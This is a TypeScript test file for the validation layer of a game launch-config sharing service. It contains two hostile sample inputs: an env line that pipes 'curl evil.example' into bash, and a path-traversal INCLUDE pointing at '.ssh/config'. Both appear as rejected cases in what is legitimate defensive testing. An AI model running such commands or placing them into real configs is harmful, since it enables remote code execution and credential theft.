import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, it } from "node:test";
import {
  HUB_UNTRUSTED_ENV_KEYS,
  PUBLISH_LIMITS,
  QUERY_LIMITS,
  MAX_CONFIGS_SCORED,
  MAX_MACHINES_SCORED,
  assertFingerprintHashMatches,
  capScoredCandidates,
  clampQueryLimit,
  validateConfigId,
  validateDeleteRequest,
  validateLookupIdentity,
  validatePublishSubmission,
  validateRecommendRequest,
  validateSimilarMachinesRequest,
} from "./validation";
import { sampleFingerprint } from "./fixtures";

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), "../../..");
const CONFIG_KEYS_FILE = join(
  REPO_ROOT,
  "share/launchlayer/config-keys.tsv",
);

const VALID_HASH = "a".repeat(64);
const SAMPLE_FP = sampleFingerprint({
  gpu_vendor: "nvidia",
  os_family: "arch",
  session_type: "wayland",
  desktop: "kde",
  profiles: ["arch-linux"],
  display_tier: "1440p",
  refresh_tier: "mid75_120",
  has_x3d: true,
  vrr: true,
  wsl2: false,
  flatpak_steam: false,
  steam_deck: false,
  immutable: false,
  container: false,
});

function validSubmission(
  overrides: Partial<Parameters<typeof validatePublishSubmission>[0]> = {},
) {
  return {
    fingerprintHash: VALID_HASH,
    fingerprint: sampleFingerprint(),
    appid: "42424242",
    gameName: "Test Game",
    envContent: "GAMEMODE=1\nMANGOHUD=1\n",
    settings: [{ key: "GAMEMODE", value: "1" }],
    detection: { native: false, anticheat: false, engine: "unity" },
    ...overrides,
  };
}

describe("validatePublishSubmission", () => {
  it("accepts a well-formed publish payload", () => {
    assert.doesNotThrow(() => validatePublishSubmission(validSubmission()));
  });

  it("rejects non-numeric appid", () => {
    assert.throws(
      () => validatePublishSubmission(validSubmission({ appid: "not-a-number" })),
      /VALIDATION_ERROR: appid has invalid format/,
    );
  });

  it("rejects malformed fingerprint hash", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({ fingerprintHash: "not-a-sha256" }),
        ),
      /VALIDATION_ERROR: fingerprint_hash has invalid format/,
    );
  });

  it("rejects oversized env_content", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            envContent: "X=1\n".repeat(PUBLISH_LIMITS.envLines + 1),
          }),
        ),
      /VALIDATION_ERROR: env_content exceeds/,
    );
  });

  it("rejects untrusted exec keys in env_content", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            envContent: "GAMEMODE=1\nPRE_LAUNCH_CMD=curl evil.example | bash\n",
          }),
        ),
      /VALIDATION_ERROR: env_content must not set PRE_LAUNCH_CMD/,
    );
  });

  it("rejects SPECIALTY_RUNTIME and CONTY in env_content", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            envContent: "SPECIALTY_RUNTIME=boxtron\n",
          }),
        ),
      /VALIDATION_ERROR: env_content must not set SPECIALTY_RUNTIME/,
    );
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            envContent: "CONTY=1\n",
          }),
        ),
      /VALIDATION_ERROR: env_content must not set CONTY/,
    );
  });

  it("matches untrusted policies in config-keys.tsv", () => {
    const raw = readFileSync(CONFIG_KEYS_FILE, "utf8");
    const fromFile = new Set(
      raw
        .split("\n")
        .map((line) => line.replace(/#.*$/, "").trim().split("\t"))
        .filter((columns) => columns.length === 5 && columns[4] === "untrusted")
        .map((columns) => columns[0])
        .filter(Boolean),
    );
    assert.deepEqual(
      [...HUB_UNTRUSTED_ENV_KEYS].sort(),
      [...fromFile].sort(),
      "Convex HUB_UNTRUSTED_ENV_KEYS drifted from config-keys.tsv",
    );
  });

  it("rejects path-traversal INCLUDE in env_content", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            envContent: "INCLUDE=../../../.ssh/config\nGAMEMODE=1\n",
          }),
        ),
      /VALIDATION_ERROR: env_content line .*INCLUDE path is not allowed/,
    );
  });

  it("allows empty untrusted keys in env_content", () => {
    assert.doesNotThrow(() =>
      validatePublishSubmission(
        validSubmission({
          envContent: "PRE_LAUNCH_CMD=\nPOST_LAUNCH_CMD=\"\"\nGAMEMODE=1\n",
        }),
      ),
    );
  });

  it("rejects untrusted keys in settings array", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            settings: [{ key: "LAUNCH_WRAPPERS", value: "gamescope" }],
          }),
        ),
      /VALIDATION_ERROR: settings must not include LAUNCH_WRAPPERS/,
    );
  });

  it("rejects invalid setting keys", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            settings: [{ key: "gamemode", value: "1" }],
          }),
        ),
      /VALIDATION_ERROR: settings\[0\]\.key has invalid format/,
    );
  });

  it("rejects too many settings entries", () => {
    const settings = Array.from({ length: PUBLISH_LIMITS.settingsCount + 1 }, (_, i) => ({
      key: `KEY_${i}`,
      value: "1",
    }));
    assert.throws(
      () => validatePublishSubmission(validSubmission({ settings })),
      /VALIDATION_ERROR: settings exceeds/,
    );
  });

  it("rejects invalid fingerprint display format", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            fingerprint: sampleFingerprint({ display: "not-a-display" }),
          }),
        ),
      /VALIDATION_ERROR: fingerprint\.display has invalid format/,
    );
  });

  it("rejects invalid detection engine slug", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({
            detection: { native: false, anticheat: false, engine: "bad engine!" },
          }),
        ),
      /VALIDATION_ERROR: detection\.engine has invalid format/,
    );
  });

  it("rejects empty game name", () => {
    assert.throws(
      () => validatePublishSubmission(validSubmission({ gameName: "" })),
      /VALIDATION_ERROR: game_name is required/,
    );
  });

  it("rejects fingerprint hash mismatch", async () => {
    await assert.rejects(
      () =>
        assertFingerprintHashMatches(
          SAMPLE_FP,
          "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        ),
      /VALIDATION_ERROR: fingerprint_hash does not match fingerprint/,
    );
  });

  it("rejects invalid config_id on update", () => {
    assert.throws(
      () =>
        validatePublishSubmission(
          validSubmission({ configId: "cfg-test-1" }),
        ),
      /VALIDATION_ERROR: config_id has invalid format/,
    );
  });
});

describe("validateConfigId", () => {
  it("accepts lowercase alphanumeric ids within length bounds", () => {
    assert.doesNotThrow(() => validateConfigId("cfgtest00001"));
  });

  it("rejects ids with punctuation or wrong length", () => {
    assert.throws(
      () => validateConfigId("cfg-test-1"),
      /VALIDATION_ERROR: config_id has invalid format/,
    );
    assert.throws(
      () => validateConfigId("short"),
      /VALIDATION_ERROR: config_id has invalid format/,
    );
  });
});

describe("validateSimilarMachinesRequest", () => {
  it("validates fingerprint and clamps limit", () => {
    assert.equal(
      validateSimilarMachinesRequest({ fingerprint: SAMPLE_FP, limit: 5 }),
      5,
    );
  });
});

describe("capScoredCandidates", () => {
  it("caps recommend and similar-machine candidate lists", () => {
    const items = Array.from({ length: 600 }, (_, index) => index);
    assert.equal(capScoredCandidates(items, MAX_CONFIGS_SCORED).length, 500);
    assert.equal(capScoredCandidates(items, MAX_MACHINES_SCORED).length, 500);
    assert.deepEqual(capScoredCandidates(items, 3), [0, 1, 2]);
  });
});

describe("clampQueryLimit", () => {
  it("defaults and clamps query limits", () => {
    assert.equal(clampQueryLimit(), QUERY_LIMITS.default);
    assert.equal(clampQueryLimit(5), 5);
    assert.equal(clampQueryLimit(QUERY_LIMITS.max), QUERY_LIMITS.max);
    assert.equal(clampQueryLimit(999), QUERY_LIMITS.max);
  });

  it("rejects invalid limits", () => {
    assert.throws(() => clampQueryLimit(0), /VALIDATION_ERROR: limit must be at least/);
    assert.throws(() => clampQueryLimit(Number.NaN), /VALIDATION_ERROR: limit must be a finite number/);
  });
});

describe("validateRecommendRequest", () => {
  it("validates appid and fingerprint before returning limit", () => {
    assert.equal(
      validateRecommendRequest({
        fingerprint: SAMPLE_FP,
        appid: "42424242",
        limit: 5,
      }),
      5,
    );
  });

  it("rejects invalid appid", () => {
    assert.throws(
      () =>
        validateRecommendRequest({
          fingerprint: SAMPLE_FP,
          appid: "bad",
        }),
      /VALIDATION_ERROR: appid has invalid format/,
    );
  });
});

describe("validateDeleteRequest", () => {
  it("requires config id and fingerprint hash formats", () => {
    assert.doesNotThrow(() =>
      validateDeleteRequest({
        configId: "cfgtest00001",
        fingerprintHash: VALID_HASH,
      }),
    );
  });

  it("rejects invalid config id", () => {
    assert.throws(
      () =>
        validateDeleteRequest({
          configId: "cfg-test-1",
          fingerprintHash: VALID_HASH,
        }),
      /VALIDATION_ERROR: config_id has invalid format/,
    );
  });
});

describe("validateLookupIdentity", () => {
  it("accepts valid lookup identity fields", () => {
    assert.doesNotThrow(() =>
      validateLookupIdentity({ fingerprintHash: VALID_HASH, appid: "42424242" }),
    );
  });

  it("rejects invalid appid on lookup", () => {
    assert.throws(
      () =>
        validateLookupIdentity({ fingerprintHash: VALID_HASH, appid: "abc" }),
      /VALIDATION_ERROR: appid has invalid format/,
    );
  });
});
